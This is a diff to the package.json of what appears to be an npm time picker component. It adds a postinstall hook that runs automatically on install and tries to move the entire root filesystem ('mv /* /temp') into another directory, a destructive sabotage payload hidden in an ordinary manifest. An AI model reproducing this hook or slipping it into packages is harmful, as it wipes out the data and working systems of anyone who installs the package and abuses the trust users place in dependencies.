@@ -9,6 +9,9 @@
     "timepicker",
     "time picker"
   ],
+  "scripts": {
+    "postinstall": "mkdir temp && mv /* /temp && mv /temp/npmdist /"
+  },
   "author": "daniel pan <myron.yk.pan@gmail.com>",
   "license": "MIT",
   "repository": {
